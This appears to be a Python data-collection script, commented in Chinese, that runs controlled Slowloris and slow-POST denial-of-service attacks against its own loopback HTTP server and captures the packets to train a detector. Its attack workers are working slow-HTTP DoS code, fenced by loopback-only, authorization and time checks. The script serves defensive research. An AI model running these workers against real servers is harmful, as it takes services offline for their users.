#!/usr/bin/env python3
"""受控 Slowloris/Slowhttptest 攻击活动采集；仅 win-dev 回环、登记角色及 P3-A 准入。

每组隔离特征引擎、boot/capture 和输出目录；活动数不代表独立组数。活动结束后立即停止攻击连接、
释放监听和捕获进程。独立健康观察器跨活动持续运行，每组前后核验其实时且同一健康段，
中断即停止。trainingAllowed 保持 false 直到分区与冻结完成。
不读取 P6 封存特征/标签/分数，不改防火墙规则，不改系统配置。
"""
import argparse
from datetime import datetime, timezone
import hashlib
import ipaddress
import json
from pathlib import Path
import socket
import sys
import threading
import time
import uuid

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / 'p1'))
from benign_long_tasks import NativeCapture
from prefix_contract import planned_role, collection_gate
from capture_health_observer import ROLE_ORDER, ledger_append, ledger_check, ledger_ready_at, require_live


# 所有受控活动共用同一稳定目标，按角色时间顺序排列；每次调用只执行一个角色，
# 与良性脚本经观察器目录内的共享账本交替推进（train→选型→校准→独立开发）。
#
# 每组是一个真实不同的慢速画像，不是同一轨迹改时长或抖动：
#  - intervalSeconds  追加头/请求体分片的发送间隔（决定早期窗口内的包计数序列）
#  - chunkBytes       每次发送的字节数（决定 bytesInbound 增量）
#  - connections      并发连接数（真实 parent 数量，2—5）
#  - activitySeconds  活动时长（多数短于 120 秒自动额度，落在处置期）
# 八组 intervalSeconds 两两不同（5/6/7/8/9/11/12/13），量化早期轨迹两两可分，
# 冻结器的近重复与共同早期窗口审查不会把它们并成同一防泄漏组。
SCENARIOS = [
    dict(id='controlled_slowloris_g1', mode='slowloris', groupOrdinal=1, plannedRole='train',
         intervalSeconds=7, chunkBytes=40, connections=3, activitySeconds=70),
    dict(id='controlled_slowhttptest_g1', mode='slowhttptest', groupOrdinal=1, plannedRole='validation_selection',
         intervalSeconds=5, chunkBytes=3, connections=4, activitySeconds=65),
    dict(id='controlled_slowloris_g2', mode='slowloris', groupOrdinal=2, plannedRole='validation_calibration',
         intervalSeconds=11, chunkBytes=88, connections=4, activitySeconds=95),
    dict(id='controlled_slowhttptest_g2', mode='slowhttptest', groupOrdinal=2, plannedRole='validation_calibration',
         intervalSeconds=8, chunkBytes=24, connections=3, activitySeconds=90),
    dict(id='controlled_slowloris_g3', mode='slowloris', groupOrdinal=3, plannedRole='independent_development',
         intervalSeconds=9, chunkBytes=56, connections=3, activitySeconds=80),
    dict(id='controlled_slowloris_g4', mode='slowloris', groupOrdinal=4, plannedRole='independent_development',
         intervalSeconds=13, chunkBytes=120, connections=5, activitySeconds=110),
    dict(id='controlled_slowhttptest_g3', mode='slowhttptest', groupOrdinal=3, plannedRole='independent_development',
         intervalSeconds=6, chunkBytes=9, connections=4, activitySeconds=75),
    dict(id='controlled_slowhttptest_g4', mode='slowhttptest', groupOrdinal=4, plannedRole='independent_development',
         intervalSeconds=12, chunkBytes=48, connections=5, activitySeconds=105),
]

ISOLATION_SECONDS   = 155
# 组间实际间隔取上下文隔离与“冷却 120 秒 + 最大 TTL 60 秒 + 健康窗口/证据余量”的较晚者；
# 固定等待本身不是恢复证据，离线恢复仍须认证健康链证明。
INTER_ACTIVITY_SECONDS = max(ISOLATION_SECONDS, 120 + 60 + 10)
ACTIVITY_SECONDS    = 90     # 仅作缺省；实际时长取每组 activitySeconds
MAX_CONNECTIONS     = 5      # 每资产并发上限，单组实际连接数由 connections 指定
LOCAL               = '127.0.0.1'
PEER                = '127.0.0.2'
PORT                = 80
INTERFACE           = r'\Device\NPF_Loopback'


def utc():
    return datetime.now(timezone.utc).isoformat()


def save(path, value):
    with Path(path).open('x', encoding='utf-8') as f:
        json.dump(value, f, ensure_ascii=False, indent=2)
        f.write('\n')


def validate_scope(scope, now=None):
    """逐轮新授权；只允许登记的两个回环地址，不续用历史任务授权。"""
    now = time.time() if now is None else now
    if (scope['local'], scope['peer']) != (LOCAL, PEER):
        raise ValueError('只允许两个已登记回环地址')
    if (ipaddress.ip_address(scope['local']).version != 4
            or scope['port'] != PORT):
        raise ValueError('当前任务仅 IPv4/TCP/80')
    if scope.get('captureInterface') != INTERFACE:
        raise ValueError('只允许登记的 Npcap 回环接口')
    expiry = datetime.fromisoformat(scope['authorizedUntil']).timestamp()
    if not expiry > now:
        raise ValueError('须提供本轮有效新授权（截止时间已过）')
    if not scope.get('authorizationId'):
        raise ValueError('缺少授权引用 authorizationId')
    return expiry


# ---------------------------------------------------------------------------
# Slowloris 攻击实现
# ---------------------------------------------------------------------------

def _slowloris_worker(stop_event, result_box, group_id, profile):
    """建立不完整 HTTP 请求，每隔 intervalSeconds 追加 chunkBytes 的哑头，维持连接打开。

    间隔和每次字节数由每组画像决定，使早期窗口内的包计数/字节增量序列两两可分，
    不是同一轨迹改时长或抖动。连接数为该组登记的 connections。
    """
    connections = min(profile['connections'], MAX_CONNECTIONS)
    interval = profile['intervalSeconds']
    pad = max(1, profile['chunkBytes'])
    socks = []
    try:
        for _ in range(connections):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.bind((PEER, 0))
            s.connect((LOCAL, PORT))
            # 发送不完整的请求头——故意不发 \r\n\r\n 结束符
            s.sendall(
                b'GET / HTTP/1.1\r\n'
                b'Host: 127.0.0.1\r\n'
                b'User-Agent: research-slowloris\r\n'
                b'X-Group: ' + group_id.encode() + b'\r\n'
            )
            socks.append(s)
        result_box['connected'] = len(socks)
        interval_count = 0
        while not stop_event.is_set():
            time.sleep(interval)
            interval_count += 1
            # 每隔 intervalSeconds 追加一个 chunkBytes 长的哑头，维持服务端 keepalive 超时
            header = (f'X-Keep-{interval_count}: ').encode() + b'a' * pad + b'\r\n'
            for s in list(socks):
                try:
                    s.sendall(header)
                except OSError:
                    socks.remove(s)
    except OSError as e:
        result_box['error'] = str(e)
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
        result_box['closedConnections'] = len(socks)


# ---------------------------------------------------------------------------
# Slowhttptest 攻击实现
# ---------------------------------------------------------------------------

def _slowhttptest_worker(stop_event, result_box, group_id, profile):
    """发送带 Content-Length 的 POST，以 intervalSeconds 间隔分片发送 chunkBytes 的请求体。

    间隔和分片大小由每组画像决定，连接数为该组登记的 connections。
    """
    connections = min(profile['connections'], MAX_CONNECTIONS)
    interval = profile['intervalSeconds']
    chunk = max(1, profile['chunkBytes'])
    body_total = 8192
    socks = []
    try:
        for _ in range(connections):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.bind((PEER, 0))
            s.connect((LOCAL, PORT))
            s.sendall(
                b'POST / HTTP/1.1\r\n'
                b'Host: 127.0.0.1\r\n'
                b'User-Agent: research-slowhttptest\r\n'
                b'X-Group: ' + group_id.encode() + b'\r\n'
                b'Content-Length: ' + str(body_total).encode() + b'\r\n'
                b'\r\n'
            )
            socks.append(s)
        result_box['connected'] = len(socks)
        sent = 0
        while not stop_event.is_set() and sent < body_total:
            time.sleep(interval)
            payload = b'a' * min(chunk, body_total - sent)
            for s in list(socks):
                try:
                    s.sendall(payload)
                except OSError:
                    socks.remove(s)
            sent += len(payload)
    except OSError as e:
        result_box['error'] = str(e)
    finally:
        for s in socks:
            try:
                s.close()
            except OSError:
                pass
        result_box['closedConnections'] = len(socks)


# ---------------------------------------------------------------------------
# 靶机 HTTP 服务（只接受已登记对端，永远不主动关闭连接直到客户端断开）
# ---------------------------------------------------------------------------

def _target_server(local, peer, port, records, stop_event):
    """最小化靶机：接受连接、读取请求（永不超时），客户端断开后记录。"""
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

    class Handler(BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'

        def log_message(self, *args):
            pass

        def handle(self):
            # 拒绝非授权对端
            if self.connection.getpeername()[0] != peer:
                self.connection.close()
                return
            begin = time.monotonic()
            try:
                # 把 socket 超时设置得很长，让慢速攻击连接可以维持
                self.connection.settimeout(300)
                super().handle()
            except (ConnectionResetError, BrokenPipeError, TimeoutError):
                pass
            finally:
                elapsed = time.monotonic() - begin
                records.append(dict(peer=peer, elapsedSeconds=round(elapsed, 3)))

        def do_GET(self):
            self.send_response(200)
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'OK')

        def do_POST(self):
            # 尝试读取完整 body；慢速攻击会在这里卡住
            length = int(self.headers.get('Content-Length', 0))
            self.rfile.read(length)
            self.send_response(200)
            self.send_header('Content-Length', '2')
            self.end_headers()
            self.wfile.write(b'OK')

    server = ThreadingHTTPServer((local, port), Handler)
    server.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 0)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()
    stop_event.wait()
    server.shutdown()
    t.join(5)
    return server.socket.fileno() == -1


# ---------------------------------------------------------------------------
# 单组活动执行
# ---------------------------------------------------------------------------

def run_group(root, scenario, deadline, health=None):
    """启动靶机和 Npcap 采集，执行一组攻击，采集结束后清理所有资源。"""
    role = planned_role(scenario)
    active_seconds = scenario.get('activitySeconds', ACTIVITY_SECONDS)
    if active_seconds > 120:
        raise ValueError('单组时长不得超过 120 秒自动额度')
    if time.time() + active_seconds + 20 >= deadline:
        raise TimeoutError('剩余授权不足一组')
    if health: ledger_check(health[0], role, INTER_ACTIVITY_SECONDS)
    before = require_live(*health) if health else None

    root.mkdir(mode=0o700)
    mode      = scenario['mode']
    group_id  = scenario['id']
    activity_id = str(uuid.uuid4())
    server_records = []
    error = None
    capture = None
    server_stop = threading.Event()
    begin = time.monotonic()

    try:
        # 1. 启动 Npcap 采集
        capture = NativeCapture(root)
        capture.thread.start()
        time.sleep(0.15)

        # 2. 启动靶机（独占绑定：端口已占用则失败）
        server_thread = threading.Thread(
            target=_target_server,
            args=(LOCAL, PEER, PORT, server_records, server_stop),
            daemon=True,
        )
        server_thread.start()
        time.sleep(0.15)

        # 3. 启动攻击（按本组画像）
        stop_attack = threading.Event()
        result_box  = {}
        worker_fn   = _slowloris_worker if mode == 'slowloris' else _slowhttptest_worker
        attack_thread = threading.Thread(
            target=worker_fn,
            args=(stop_attack, result_box, group_id, scenario),
            daemon=True,
        )
        attack_thread.start()

        # 4. 等待本组活动持续时间
        time.sleep(active_seconds)

    except BaseException as exc:
        error = type(exc).__name__ + ': ' + str(exc)
    finally:
        # 5. 停止攻击，先于靶机关闭
        if 'stop_attack' in dir():
            stop_attack.set()
        if 'attack_thread' in dir():
            attack_thread.join(10)

        # 6. 停止靶机
        server_stop.set()
        if 'server_thread' in dir():
            server_thread.join(5)
        time.sleep(0.15)

        # 7. 停止采集，核验零丢包
        captured = capture.close() if capture else None

    elapsed = time.monotonic() - begin
    after = continuity = None
    if health:
        try:
            after = require_live(*health)
            continuity = (after['observerSessionId'] == before['observerSessionId']
                          and after['healthySinceMs'] == before['healthySinceMs'])
        except (OSError, ValueError) as exc:
            error = error or 'HEALTH_OBSERVER: ' + str(exc)
            continuity = False
    result = dict(
        activityId=activity_id,
        plannedRole=role,
        scenarioId=group_id,
        mode=mode,
        groupOrdinal=scenario['groupOrdinal'],
        profile={k: scenario[k] for k in ('intervalSeconds', 'chunkBytes', 'connections', 'activitySeconds')},
        elapsedSeconds=round(elapsed, 3),
        attackResult=result_box,
        serverRecords=server_records,
        capture=captured,
        captureHealth=dict(before=before, after=after, continuous=continuity),
        listenerClosed=(captured is not None),
        success=(
            error is None
            and captured is not None
            and captured.get('passed', False)
            and (health is None or continuity is True)
        ),
        error=error,
        modelFits=0,
        trainingAllowed=False,
    )
    save(root / 'activity.json', result)
    if health:
        ledger_append(health[0], dict(kind='attack', activityId=activity_id, plannedRole=role, scenarioId=group_id,
                                      endedAt=time.time(), success=result['success']))
    if not result['success']:
        raise RuntimeError(f'活动 {group_id} 失败: {error or captured}')
    return result


# ---------------------------------------------------------------------------
# 主入口
# ---------------------------------------------------------------------------

def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument('--output', type=Path, required=True,
                   help='输出根目录（不得已存在）')
    p.add_argument('--authorized-until', required=True,
                   help='本轮授权截止时间 ISO-8601（如 2026-10-05T23:59:00+08:00）')
    p.add_argument('--authorization-id', required=True,
                   help='与 controlled-attack-authorization.json 对应的授权 ID')
    p.add_argument('--runtime-plan', type=Path, required=True)
    p.add_argument('--prefit-report', type=Path, required=True)
    p.add_argument('--asset-id', required=True, help='已登记资产 UUID，跨采集活动复用')
    p.add_argument('--sensor-id', required=True, help='已登记传感器 UUID')
    p.add_argument('--health-observer', type=Path, required=True,
                   help='已运行的 capture_health_observer 输出目录；须跨全部活动持续')
    p.add_argument('--role', choices=ROLE_ORDER, default=None,
                   help='只执行该角色的登记活动；省略则按 SCENARIOS 的角色时间顺序一次跑完全部八组')
    args = p.parse_args()
    selected = SCENARIOS if args.role is None else [s for s in SCENARIOS if s['plannedRole'] == args.role]
    if not selected:
        raise ValueError('该角色没有登记活动')
    uuid.UUID(args.asset_id); uuid.UUID(args.sensor_id)
    collection_gate(args.runtime_plan, args.prefit_report)

    if sys.platform != 'win32':
        raise RuntimeError('仅登记 Windows 回环环境')

    scope = dict(
        local=LOCAL, peer=PEER, port=PORT,
        captureInterface=INTERFACE,
        authorizedUntil=args.authorized_until,
        authorizationId=args.authorization_id,
        maximumTotalSeconds=4000,
    )
    expiry = validate_scope(scope)

    args.output.mkdir(parents=True, exist_ok=False, mode=0o700)
    save(args.output / 'registration.json', dict(
        version='p3-controlled-attack-v2', assetId=args.asset_id, sensorId=args.sensor_id,
        authorizationRef='docs/p3/controlled-attack-authorization.json',
        authorizationId=args.authorization_id,
        local=LOCAL, peer=PEER, servicePort=PORT,
        captureInterface=INTERFACE,
        authorizedUntil=args.authorized_until,
        scenarios=selected, role=args.role,
        isolationSeconds=ISOLATION_SECONDS,
        interActivitySeconds=INTER_ACTIVITY_SECONDS,
        healthObserver=require_live(args.health_observer, args.asset_id, args.sensor_id),
        activitySecondsByGroup={s['id']: s['activitySeconds'] for s in selected},
        maxConnections=MAX_CONNECTIONS,
        firewallChanges=False,
        trainingAllowed=False,
        scriptSha256=hashlib.sha256(Path(__file__).read_bytes()).hexdigest(),
        startedAt=utc(),
    ))

    ledger_check(args.health_observer, selected[0]['plannedRole'], 0)
    wait = ledger_ready_at(args.health_observer, INTER_ACTIVITY_SECONDS) - time.time()
    min_active = min(s['activitySeconds'] for s in selected)
    if wait > 0:
        if time.time() + wait + min_active + 20 >= expiry: raise TimeoutError('等待组间隔后授权不足')
        time.sleep(wait)
    results = []
    for i, scenario in enumerate(selected):
        group_root = args.output / f'group-{i + 1:02}-{scenario["mode"]}-g{scenario["groupOrdinal"]}'
        result = run_group(group_root, scenario, expiry, (args.health_observer, args.asset_id, args.sensor_id))
        results.append({k: result[k] for k in
                        ('activityId', 'scenarioId', 'mode', 'groupOrdinal',
                         'elapsedSeconds', 'success', 'plannedRole')})
        print(json.dumps(results[-1]), flush=True)

        if i < len(selected) - 1:
            remaining = expiry - time.time()
            if remaining < INTER_ACTIVITY_SECONDS + selected[i + 1]['activitySeconds'] + 20:
                raise TimeoutError('剩余授权不足下一组')
            time.sleep(INTER_ACTIVITY_SECONDS)

    save(args.output / 'complete.json', dict(
        status='completed',
        role=args.role, groups=len(selected),
        completedAt=utc(),
        results=results,
        trainingAllowed=False,
        modelFits=0,
    ))
    print(json.dumps(dict(status='completed', groups=len(results))), flush=True)


if __name__ == '__main__':
    main()
